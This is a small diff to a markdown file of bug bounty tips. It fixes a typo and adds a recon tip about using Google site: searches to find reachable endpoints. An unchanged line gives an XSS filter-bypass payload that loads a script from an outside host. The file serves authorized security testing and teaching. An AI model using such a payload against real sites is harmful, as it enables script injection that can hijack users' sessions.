@@ -1,7 +1,7 @@
 # Bug Bounty Tips
 
 ### Recon
-- Don't stop when you see the response forbidden/not found on the target you are testing, run dirsearch or any tool you prefer to find endpoints, like recon in [this writup](https://medium.com/bugbountywriteup/900-xss-in-yahoo-recon-wins-65ee6d4bfcbd).
+- Don't stop when you see the response forbidden/not found on the target you are testing, run dirsearch or any tool you prefer to find endpoints, like recon in [this writeup](https://medium.com/bugbountywriteup/900-xss-in-yahoo-recon-wins-65ee6d4bfcbd); or google the site (site:domain.com) you may find an endpoint which is accessible, like in [this writeup](https://medium.com/@sudhanshur705/story-about-my-first-bug-bounty-9fe710be8241).
 
 ### XSS
 - I love it when a site creates a filter to 'try' prevent something like XSS (or even certain file extensions from being uploaded:D). In this case, [xss filter bypass: </script><%0dscript%20src=\http://mysite.com/yay.js>](https://www.bugbountynotes.com/forum/viewpost?id=100)
